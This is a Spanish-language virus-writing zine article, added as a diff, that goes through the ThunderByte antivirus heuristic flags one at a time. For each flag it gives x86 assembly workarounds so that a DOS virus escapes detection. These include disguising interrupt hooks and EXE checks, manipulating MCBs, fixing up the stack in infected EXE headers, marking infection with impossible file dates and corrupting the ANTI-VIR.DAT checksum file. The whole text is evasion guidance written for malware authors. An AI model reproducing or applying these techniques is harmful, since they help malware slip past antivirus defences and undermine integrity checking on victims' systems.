@@ -1,0 +1,384 @@
+Full Thunderbyte Stealth...
+-------------------------------------------------------------------------------
+   Lo que ac  tratamos de hacer, es enumerar TODOS los posibles flags del
+Thunderbyte, cosa de que no les quede la duda si su virus va a hacer saltar una
+alarma bajo una circunstancia espec¡fica. En definitiva, este texto es el mismo
+que el del n£mero anterior, pero ahora mas completo.
+
+
+Flag "B" - Back to entry point
+------------------------------
+   Este es el que indica cuando un prog. en alg£n lugar de todo su c¢digo, re_
+   gresa al Entry Point, osea al principio... Para un COM ser¡a un salto al
+   principio, osea al offset 100h:
+
+	MOV	AX, 100h
+	JMP	AX
+
+   Y esto se caga de la misma forma...:
+
+	PUSH	100h
+	POP	AX
+	JMP	AX
+
+Flag "E" - Flexible entry point
+-------------------------------
+   Este es el que avisa cuando estamos calculando el offset actual, se acuer_
+   dan ? Bueno, la forma cl sica ser¡a ‚sta:
+
+	CALL	OBTENER_DIRECCION
+OBTENER_DIRECCION:
+	POP	BP
+	SUB	BP, OFFSET OBTENER_DIRECCION
+
+   Y la forma anti-tb ser¡a simulando ese POP:
+
+	CALL	OBTENER_DIRECCION
+OBTENER_DIRECCION:
+	MOV	DI, SP
+	MOV	BP, WORD PTR SS:[DI]
+	SUB	BP, OFFSET OBTENER_DIRECCION
+	INC	SP
+	INC	SP
+
+Flag "Z" - EXE/COM determination
+--------------------------------
+   Este es el culpable de la detecci¢n de muchos de los virus...en programaci¢n
+   convencional no es de lo mas utilizado :-)
+   Originalmente lo que hac¡amos era: leer los 2 primeros bytes del archivo, 
+   tirarlos a un b£ffer, y comparar ese b£ffer con 'ZM' (ojo! con ZM y no con
+   MZ debido al almacenamiento inverso de palabras).
+   Por ejemplo (Suponiendo que ya tenemos los 2 primeros bytes en un b£ffer...)
+
+	CMP	WORD PTR [BUFFER], 'ZM'
+	JNE	NO_ES_EXE
+	...
+	...
+	...
+
+   Ahora bien... este es el procediemiento convencional.
+   Pero otra forma de hacer esto, es por ejemplo, comparar byte x byte:
+
+	CMP	BYTE PTR [BUFFER], 'M'		;<--- Ojo! Ac  no lo comparamos
+						; con ZM porque estamos compa_
+						; rando byte x byte, no todo el
+						; word junto, entonces primero
+						; lo comparo con M y despu‚s
+						; con Z.
+	JNE	NO_ES_EXE
+	CMP	BYTE PTR [BUFFER+1], 'Z'
+	JNE	NO_ES_EXE
+	...					;<--- Si lleg¢ hasta ac , es
+	...					; porque es un EXE.
+	...
+
+Flag "S" - Search for executables
+---------------------------------
+   Este es el que te deschava la rutina de b£squeda de ejecutables... para un
+   no_residente, es impresindible, y por lo tanto impresindible su ocultamien_
+   to. Lo que originalmente hac¡amos era buscar *.COM ¢ *.EXE en alg£n directo_
+   rio, pero lo que podemos hacer es, en vez de buscar los *.COM ¢ *.EXE, bus_
+   car los "*.C?M" ¢ "*.E?E", y despu‚s verificar si la letra del medio es una
+   "O" ¢ una "E" respectivamente... por ejemplo:
+   (Suponiendo que el nombre del file ya lo tenemos en una variable DTA_AREA)
+
+;Verificar si es realmente un .COM y que no sea un .CAM o algo as¡...
+;Para eso, muevo el puntero hasta el comienzo de la extensi¢n (buscando el pun_
+;to en el filename) y lo incremento en 1, para que apunte a la letra del medio
+;de la extensi¢n... que es la que nos interesa.
+;Ahora busco el punto:
+
+	MOV	CX, 13d				;13d es lo m ximo que puede me_
+						;dir el filename.
+	LEA	SI, DTA_AREA+1Eh		;1Eh es el desplazamiento del
+						; filename en el area del DTA.
+	LEA	DI, PUNTOS			;Puntos es una variable llena
+						; de puntos (.)
+	REPNE	CMPSB
+
+;El punto lo tiene que encontrar s¡ o s¡, entonces incremento el puntero para
+;que apunte al caracter del medio de la extensi¢n:
+
+	INC	SI
+	CMP	BYTE PTR [SI], 'O'
+	JNE	NO_ES_COM
+	...					;<--- Si lleg¢ hasta ac , es
+	...					; porque es un COM real, y no
+	...					; un CAM o algo as¡...
+
+
+Flag "U" - Undocumented interrupt/DOS calls
+-------------------------------------------
+   Este se dispara cuando se hacen llamadas a servicios no_documentados, por
+   ejemplo para desactivar el Vsafe...Para cagarlo se puede hacer lo mismo que
+   antes: en vez de MOVer los valores, pasarlos por la pila y listo.
+
+Flag "T" - Incorrect time stamp
+-------------------------------
+   El TB avisa de este problema cuando encuentra una fecha incorrecta, o impo_
+   sible. Osea, un archivo que fue creado en el a¤o 2094 por ejemplo. Esto apa_
+   rece generalmente en los archivos infectados por un stealh, y hace esto para
+   comprobar infecci¢n, ya que si tiene que abrir todos los archivos para veri_
+   ficar si ya est n infectados, ser¡a el virus mas lento del mundo. La forma
+   tradicional es sumarle 100 o 200 al a¤o del archivo, cosa de que si se mira
+   la fecha con un dir, o con otra cosa, muestre la misma fecha (que realmente
+   es la misma, pero 100 a¤os mas adelante).
+   Ejemplo:
+
+	Nombre		Fecha real	Fecha que muestra el dir
+	--------------------------------------------------------
+	MEM.EXE		01/01/1994	01/01/94	;<-- Sin infectar
+	MEM.EXE		01/01/2094	01/01/94	;<-- Infectado
+
+Flag "M" - Memory resident code
+-------------------------------
+   Bueno, el TB avisa sobre este flag cuando encuentra que obtenemos y/¢ setea_
+   mos los vectores de interrupci¢n. Una forma de cagarlo es la t¡pica. En vez
+   de poner por ejemplo :
+
+		MOV	AX, 3521H
+		INT	21H
+
+   Poner :
+
+		PUSH	3521H
+		POP	AX
+		INT	21H
+
+   Pero otra manera de hacer lo mismo es, en vez de ocultar el servicio, ocul_
+   tar el VECTOR. El TB avisa que es c¢digo residente £nicamente con interrup_
+   ci¢nes cr¡ticas, como por ejemplo la 13h ¢ la 21h. Osea que lo que podr¡amos
+   hacer, es, en vez de decirle que obtenga un vector N, que obtenga un vector
+   N-1 y despu‚s incrementarle 1.. Es solo un ejemplo :
+
+		MOV	AX, 3521H
+		INT	21H
+
+   Cambiarlo por:
+
+		MOV	AX, 3520H
+		INC	AL
+		INT	21H
+
+Flag "L" - The prog. traps the loading of software
+--------------------------------------------------
+   Este flag se dispara en el momento que el TB se da cuenta de la t¡pica com_
+   paraci¢n de verificar si es el servicio de ejecuci¢n de un file (4bh) una
+   vez que hookeamos la 21h :
+
+		CMP	AH, 4BH
+
+   Para cagar esto, en vez de comparar AH con 4BH, podemos pasar el valor que
+   vamos a comparar a otro lado y compararlo en otro registro, cosa de que no
+   sea tan evidente para el TB que estamos comparando el servicio :
+
+		XCHG	AH, AL		; Los XCHG son mas que nada para no mo_
+		CMP	AL, 4BH		; dificar ning£n registro.
+		XCHG	AH, AL		;
+
+Flag "c" - No checksum data
+---------------------------
+   Este salta cuando el TB no encuentra el ANTI-VIR.DAT, que es un archivito
+   que crea en cada directorio, donde guarda informaci¢n cr¡tica de cada pro_
+   grama, como por ejemplo los primeros bytes de un COM y su tama¤o ¢ el Entry
+   Point de un EXE y otras boludeces, adem s de guardar el CRC del archivo ori_
+   ginal. En caso de que un archivo quede infectado, y siga existiendo el ANTI-
+   VIR.DAT, el TB se da cuenta que el archivo fu‚ modificado y larga el cartel
+   de alarma, y hasta puede llegar a limpiar el archivo infectado.
+
+   O sea que lo que nos conviene es que este archivito no exista mas, o mejor,
+   que no lo reconozca como archivo de checksum... Para esto, en vez de borrar_
+   lo, lo que se puede hacer es modificar su header.. Con los primeros bytes es
+   suficiente... En vez de que diga:"Thunderbyte...", sobreescribimos el header
+   con basura...
+
+   La ventaja de modificarlo en vez de borrarlo, es que se evita la posibilidad
+   que se den cuenta que les falta ese archivo. De esta manera lo ven, pero
+   est  al pedo ;-)
+
+Flag "G" - Garbage instructions,
+Flag "#" - Found an instruction decryption routine,
+Flag "!" - Invalid opcode
+--------------------------------------------------
+   Esto es lo que marca cuando encuentra "basura" en el file... Esta pseudo_
+   basura, es generalmente lo que queda luego de una encripci¢n... Al encrip_
+   tar un virus, el c¢digo que queda (obviamente no ejecutable) puede ser toma_
+   do como basura para el TB. Entonces el TB interpreta esa basura como un po_
+   sible resultado de una encripci¢n, y dispara ese flag.
+   Una posible soluci¢n es que el resultado de la encriptaci¢n no sea mayor que
+   la instrucci¢n mas alta. Una forma de lograr esto es rotando 1 bit, o ha_
+   ciendo alguna operacion que no se sarpe..
+   Otra forma es haciendo un falso exit antes del c¢digo encriptado...Con esto
+   el TB se cree que lo que sigue son datos del programa y no lo toma como ba_
+   sura. Estructura:
+
+	JMP	DECRYPT		;<ÄÄÄÄÄ Jump al virus
+		...		;<ÄÄÄÄÄ Programa anfitri¢n
+
+DECRYPT:	...		;<ÄÄÄÄÄ Rutina de desencripci¢n
+	JMP	TE_CAGUE	;<ÄÄÄÄÄ Salto para no ejecutar la salida al DOS
+		MOV	AH, 4Ch	;<ÄÂÄÄÄ C¢digo que no se ejecuta nunca
+		INT	21h	;<ÄÙ
+TE_CAGUE:
+		...		;<ÄÄÄÄÄ Continuaci¢n de la rutina de desencrip.
+		¨ÆA¬		;<ÄÄÄÄÄ Virus encriptado (basura)
+
+   Ahora bien, como se tardo DEMASIADO en lanzar el segundo n£mero de la revis_
+   ta, ahora el TB se da cuenta del JMP que est  antes de la salida al DOS.
+   Pero bueno, eso no significa que nos va a cagar, no? NO! No nos va a cagar
+   nada, porque lo que se puede hacer (gracias a la ingeniosidad de Leviathan,
+   quien totalmente perturbado, porque el TB 6.20 le cagaba el Xou da Xuxa, se
+   qued¢ toda una noche sin dormir y sac¢ la nueva versi¢n ANTI-TB 6.20 :) es
+   hacer una llamada al DOS al pedo, como por ejemplo pedir la fecha. Con hacer
+   una llamda no me refiero a CUALQUIER llamada, sino que cualquiera que no me
+   destruya los registros de clave y dem s. El c¢digo quedar¡a de la siguiente
+   manera :
+
+	JMP	DECRYPT		;<ÄÄÄÄÄ Jump al virus
+		...		;<ÄÄÄÄÄ Programa anfitri¢n
+
+DECRYPT:	...		;<ÄÄÄÄÄ Rutina de desencripci¢n
+
+	JMP	TE_CAGUE	;<ÄÄÄÄÄ Salto para no ejecutar la salida al DOS
+		MOV	AH, 4Ch	;<ÄÂÄÄÄ C¢digo que no se ejecuta nunca
+		INT	21h	;<ÄÙ
+TE_CAGUE:
+		MOV	AH, XXX	;<ÄÄÄÄÄ LLamada al pedo, pero que no estrop‚e
+		INT	XX	;	nada.
+		...		;<ÄÄÄÄÄ Continuaci¢n de la rutina de desencrip.
+
+		¨ÆA¬		;<ÄÄÄÄÄ Virus encriptado (basura)
+
+Flag "p" - Packed program
+-------------------------
+   Este en realidad no es un flag de alarma, es un flag al pedo que nos avisa
+   que el archivo est  comprimido y que puede ser que en su interior contenga
+   un virus.
+
+Flag "F" - Suspicious file access
+---------------------------------
+   Este flag salta cuando el TB encuentra que el programa tiene c¢digo capaz de
+   modificar los atributos de un file.. Se puede cagar de la misma forma que la
+   mayor¡a: En vez de MOVer el valor del servicio en AH, PUSHearlo y POPearlo.
+
+Flag "?" - Inconsistent EXE header
+----------------------------------
+   El TB nos avisa de este flag, cuando encuentra que en el header EXE hay in_
+   formaci¢n incongruente.. Un ejemplo es que el header, en el campo donde
+   guarda el tama¤o dle file, indica un valor, pero el file realmente ocupa
+   mas.. Esto podr¡a ser causado por un programa que usa overlays, o por un vi_
+   rus que calcula mal el nuevo tama¤o.
+
+Flag "O" - Code that overwrites/moves a prog. in memory
+-------------------------------------------------------
+   Esto se produce por lo general cuando tratamos de restaurar los primeros
+   bytes del Hoste en un COM. Por lo general hacemos:
+
+	mov di, 100h
+	lea si, [offset BYTES_ORIGINALES+bx]	;<- BX contiene off. del virus.
+	movsb
+	movsw
+
+   (Ojo que esto se puede hacer de varias maneras distintas, pero, 
+   basicamente, es como esta arriba).
+   Aqui basta con reemplazar el MOV DI, 100 por un PUSH 100, POP DI.
+
+Flag "A" - Suspicious memory allocation
+---------------------------------------
+   Esta flag es disparada por un codigo como este:
+	mov ax, ds
+	dec ax
+	mov es, ax
+	cmp byte ptr es:[0], 5ah
+	mov ax, es:[3]
+	mov dx, es
+	add dx, ax
+	... etc...
+   (Como se ve, se esta tratando de hacer alguna manipuacion de los MCBs)
+   Se lo puede cagar cambiando el valor 5A por otro, de esta manera:
+
+	;en vez de ...
+				cmp byte ptr es:[0], 5ah
+
+	;poner
+				inc byte ptr es:[0]
+				cmp byte ptr es:[0], 5bh
+
+   Modifica el valor del MCB, pero es la unica forma :-).
+
+Flag "J" - Suspicious jump construct
+------------------------------------
+   Lo dispara una larga cadena de JMPs (al menos 2) a posiciones mas o menos
+   lejanas entre si. Un ejemplo:
+
+	Start:		JMP Continuar
+			...
+	Continuar:	JMP Virus
+			...
+	Virus:		<Virus>
+
+   El remplazo de los JUMPs por equivalentes de PUSH y RET es ineficaz,
+   incluso haciendolo con PUSH immediate. Lo mismo el remplazo de los JMPs
+   planos y sencillos por JMPs mas elaborados, por ejemplo, con variables,
+   etc. Esto se soluciona reemplazando la orden JMP por una manipulacion de la
+   orden CALL. Se usa la orden call, y luego se deshecha el offset que queda
+   en la stack, haciendo que quede todo como si fuera un JMP. Por ejemplo:
+
+	Start:		CALL Continuar
+			...
+	Continuar:	ADD SP, 2
+			CALL Virus
+			...
+	Virus:		ADD SP, 2
+			<Virus>
+
+Flag "K" - Unusual stack
+------------------------
+   Este aparece en la infeccion de EXE's. El problema de este flag es que salta
+   cuando alguna de estas 2 condiciones aparece.. 
+
+   1) Que el Stack Segment (SS) y el Code Segment (CS) apuntan al mismo
+      segmento. Cosa de lo mas normal, porque lo t¡pico es poner al SS unos by_
+      tes despues del virus, compartiendo el mismo segmento que el CS del
+      virus, (el mismo CS que aparece en el header y el del programa en defini_
+      tiva)..
+
+   2) Que el Stack Pointer (SP) sea impar (odd stack).. esto es debido al di_
+      se¤o del micro, el cual no esta preparado para situaciones de, por ejem_
+      lo, un desbordamiento de segmento con un SP impar.. en este caso se col_
+      gar¡a la m quina.. Esta bien, se puede usar un SP impar, pero no es lo
+      aconsejable.. no se va a colgar por eso, pero tengan en cuenta las posi_
+      bilidades.. Pero si al TB no le gusta, NO LO HACEMOS Y PUNTO, OK?!? :)
+
+   Bueno, el primero es facil de cagar.. lo unico que hay que hacer es, cuando
+   calculamos el nuevo CS:IP del programa (apuntando al virus), incrementamos
+   ese CS que tenemos ahi y lo ponemos como nuevo SS:
+
+	;Ahora tendriamos que pasar el CS incrementado a la variable del
+	;header en el campo que corresponda...:
+	; Initial Stack Segment: offset 0eh del header
+	; Initial Stack Pointer: offset 10h del header
+	INC AX				;<--- En AX por ejemplo tenemos el
+					; CS calculado, y luego del INC, pasa
+					; a ser el nuevo SS.
+	MOV WORD PTR DS:[HEADER+0eh], AX; O lo que mierda sea en sus casos para
+					; pasar el dato al nuevo header.
+
+   Ahora bien, lo que nos queda es el SP que tiene que quedar par.. Bueno,
+   que les puedo decir ? :) Como el stack lo ponen donde UDS. quieren, lo cal_
+   culan par al terminar el virus y listo...
+   El virus tiene una longitud constante, y como la longitud de separaci¢n
+   entre el fin del virus y el stack, lo ponemos nosotros, la calculamos para
+   que la suma de los 2, sea par y listo..
+
+Flag "D" - Disk write access
+----------------------------
+   Los rumores cuentan que este flag hace su aparicion en los accesos de escri_
+   tura directa al disco , se evita camufleando la llamada a la interupcion. 
+  
+Flag "R" - Relocator
+--------------------
+   Para eludir este flag se debe camuflear los registros por medio de operacio_
+   nes del tipo phush y pop o algo asi. Si les aparece este flag matensen.....
+   (su virus es una shit (-mierda-).
+ 
